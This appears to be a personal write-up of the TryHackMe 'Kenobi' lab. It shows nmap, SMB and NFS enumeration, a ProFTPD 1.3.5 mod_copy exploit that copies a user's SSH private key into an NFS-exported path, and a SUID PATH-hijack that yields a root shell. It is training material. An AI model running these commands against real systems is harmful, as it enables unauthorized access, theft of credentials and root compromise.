#THM #Linux #EscaltePriv #EnumerateSmb #proftp

#### Nmap

```bash
nmap 10.10.124.62 -sC -sV

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
   | ssh-hostkey: 
   |   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
   |   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
   |_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
   |_http-server-header: Apache/2.4.18 (Ubuntu)
   | http-robots.txt: 1 disallowed entry 
   |_/admin.html
   |_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
   | rpcinfo: 
   |   program version    port/proto  service
   |   100000  2,3,4        111/tcp   rpcbind
   |   100000  2,3,4        111/udp   rpcbind
   |   100000  3,4          111/tcp6  rpcbind
   |   100000  3,4          111/udp6  rpcbind
   |   100003  2,3,4       2049/tcp   nfs
   |   100003  2,3,4       2049/tcp6  nfs
   |   100003  2,3,4       2049/udp   nfs
   |   100003  2,3,4       2049/udp6  nfs
   |   100005  1,2,3      32872/udp6  mountd
   |   100005  1,2,3      36937/tcp6  mountd
   |   100005  1,2,3      41276/udp   mountd
   |   100005  1,2,3      50057/tcp   mountd
   |   100021  1,3,4      33916/udp6  nlockmgr
   |   100021  1,3,4      34584/udp   nlockmgr
   |   100021  1,3,4      41689/tcp6  nlockmgr
   |   100021  1,3,4      44549/tcp   nlockmgr
   |   100227  2,3         2049/tcp   nfs_acl
   |   100227  2,3         2049/tcp6  nfs_acl
   |   100227  2,3         2049/udp   nfs_acl
   |_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)

Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
   |_clock-skew: mean: 2h00m01s, deviation: 3h27m51s, median: 0s
   | smb2-security-mode: 
   |   3.1.1: 
   |_    Message signing enabled but not required
   |_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
   | smb-security-mode: 
   |   account_used: guest
   |   authentication_level: user
   |   challenge_response: supported
   |_  message_signing: disabled (dangerous, but default)
   | smb2-time: 
   |   date: 2021-12-13T00:35:19
   |_  start_date: N/A
   | smb-os-discovery: 
   |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
   |   Computer name: kenobi
   |   NetBIOS computer name: KENOBI\x00
   |   Domain name: \x00
   |   FQDN: kenobi
   |_  System time: 2021-12-12T18:35:19-06:00
```

#### SAMBA

* use nmap to enumerate smb shares
	* SMB has two ports, 445 and 139
	* ![smb](https://i.imgur.com/bkgVNy3.png)

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.124.62

Host script results:
  | smb-enum-shares: 
  |   account_used: guest
  |   \\10.10.124.62\IPC$: 
  |     Type: STYPE_IPC_HIDDEN
  |     Comment: IPC Service (kenobi server (Samba, Ubuntu))
  |     Users: 2
  |     Max Users: <unlimited>
  |     Path: C:\tmp
  |     Anonymous access: READ/WRITE
  |     Current user access: READ/WRITE
  |   \\10.10.124.62\anonymous: 
  |     Type: STYPE_DISKTREE
  |     Comment: 
  |     Users: 0
  |     Max Users: <unlimited>
  |     Path: C:\home\kenobi\share
  |     Anonymous access: READ/WRITE
  |     Current user access: READ/WRITE
  |   \\10.10.124.62\print$: 
  |     Type: STYPE_DISKTREE
  |     Comment: Printer Drivers
  |     Users: 0
  |     Max Users: <unlimited>
  |     Path: C:\var\lib\samba\printers
  |     Anonymous access: <none>
  |_    Current user access: <none>
```
[[TryHackMe skynet]]
* inspect a share with *smbclient //\<ip\>/anonymous*
	* recusively download SMB share with *smbget -R smb://\<ip\>/anonymous*

```bash
smbclient //10.10.124.62/anonymous
smb: \>
```

* enumerate nfs on rpcbind
```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.124.62

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var 
```

#### ProFtpd

* use searchsploit (command line search tool for exploit-db.com) for particular software versions
```bash
searchsploit proftpd 1.3.5

ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                      | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                  | linux/remote/49908.py
ProFTPd 1.3.5 - File Cop
```

* exploit from ProFtpd's mod_copy module
	* SITE CPFR and SITE CPTO can be used to copy files/directories from one place to another on the server
	* Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination
	* Because we know /var is a mount on the server
		* we can connect to the server and copy Kenobi's private key using SITE CPFR and SITE CPTO commands to /var/tmp

```bash
nc 10.10.124.62 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.124.62]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

* mount the /var/tmp directory to our machine
```bash
mkdir /mnt/kenobiNFS  
mount machine_ip:/var /mnt/kenobiNFS  
ls -la /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
ssh -i /mnt/kenobiNFS/tmp/id_rsa kenobi@10.10.124.62
```

#### Priviledge Escalation with Path Variable Manipulation

| Permissions | On Files                                                         | On Directories                                            |
| ----------- | ---------------------------------------------------------------- | --------------------------------------------------------- |
| SUID Bit    | User executes the file with permissions of the \_file_ owner     | -                                                         |
| SGID Bit    | User executes the file with the permission of the _group_ owner. | File created in directory gets the same group owner.      |
| Sticky Bit  | No meaning                                                       | Users are prevented from deleting files from other users. |

```bash
find / -perm -u=s -type f 2>/dev/null
find . -perm /6000 (also works but not that nice)
```

* use strings to print human readable strings in binary
```bash
strings /usr/bin/me

curl -I localhost
uname -r
ifconfig
....
```
* shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname)
* as this file runs as the root users privileges, we can manipulate our path gain a root shell
```bash
find -type d -maxdepth 2 -writable => /tmp

echo /bin/sh > curl
chmod 777 curl
export PATH=\tmp:$PATH
/usr/bin/menu

uid=0(root) >
```
* first find out where we have accsess rights
* we then copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path

